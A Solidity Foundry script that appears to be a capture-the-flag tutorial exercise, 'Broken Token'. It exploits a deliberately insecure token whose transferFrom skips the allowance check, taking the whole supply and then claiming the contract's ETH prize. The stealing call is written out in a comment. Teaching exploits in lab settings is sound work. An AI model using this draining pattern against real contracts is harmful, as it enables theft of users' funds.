// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "forge-std/console.sol";

// ═══════════════════════════════════════════════════════════════════════════════
// Tutorial 3: Broken Token
// Your first smart contract exploit -stealing tokens via a missing allowance check.
//
// HOW TO RUN:
//   In the Solidity IDE, click "Run Script" -Forge will compile and broadcast.
//
//   Or from the command line after starting the challenge:
//     cd solve && ./env.sh && source .env
//     forge script challenges/broken-token/Script.s.sol \
//       --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast
//
// GOAL: Fill in the ONE line marked "YOUR LINE HERE".
//       The two-step exploit below does the rest automatically.
// ═══════════════════════════════════════════════════════════════════════════════

/// @notice Minimal interface for the InsecureToken contract.
/// @dev    We only declare the functions we need -no need for the full ABI.
interface IInsecureToken {
    /// @notice Returns the token balance of an address.
    function balanceOf(address account) external view returns (uint256);

    /// @notice Transfer tokens from `from` to `to` -no allowance check!
    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    /// @notice Claim the ETH prize pool (requires holding >= 500,000 ISEC).
    function claimPrize() external;

    /// @notice Returns the total token supply (all held by the contract at start).
    function totalSupply() external view returns (uint256);
}

contract BrokenTokenScript is Script {
    function run() external {
        // ── Load environment variables injected by the engine ─────────────────
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player     = vm.addr(privateKey);

        // ADDR_INSECURE_TOKEN is auto-injected because the contract id is
        // "insecure-token" (hyphens become underscores, uppercased).
        address tokenAddr  = vm.envAddress("ADDR_INSECURE_TOKEN");

        IInsecureToken token = IInsecureToken(tokenAddr);

        // ── Print state before the exploit ────────────────────────────────────
        console.log("=== Broken Token Exploit ===");
        console.log("Player:           ", player);
        console.log("Contract ETH:     ", tokenAddr.balance);
        console.log("Contract ISEC:    ", token.balanceOf(tokenAddr));
        console.log("Player ISEC:      ", token.balanceOf(player));

        // ── Start broadcasting -everything below is sent on-chain ────────────
        vm.startBroadcast(privateKey);

        // ── Step 1: Steal all tokens from the contract ───────────────────────
        // The transferFrom() function does NOT check allowances.
        // We can move the contract's own tokens to ourselves with no approval.
        //
        // YOUR LINE HERE -call transferFrom to steal the tokens:
        //   Arguments:
        //     from:   tokenAddr              (the contract that holds the tokens)
        //     to:     player                 (your address)
        //     amount: token.totalSupply()    (the full 1,000,000 ISEC supply)
        //
        // token.transferFrom(tokenAddr, player, token.totalSupply());

        // ── Step 2: Claim the ETH prize ──────────────────────────────────────
        // Now that we hold >= 500,000 ISEC, claimPrize() will send us the ETH.
        // (This line is already filled in for you -just fill in Step 1 above.)
        token.claimPrize();

        vm.stopBroadcast();

        // ── Print state after the exploit ─────────────────────────────────────
        console.log("=== After Exploit ===");
        console.log("Contract ETH:     ", tokenAddr.balance);
        console.log("Player ETH:       ", player.balance);
        console.log("Player ISEC:      ", token.balanceOf(player));

        if (tokenAddr.balance < 0.1 ether) {
            console.log("SUCCESS: Contract drained - challenge complete!");
        } else {
            console.log("Not done yet - did you fill in the transferFrom call?");
        }
    }
}
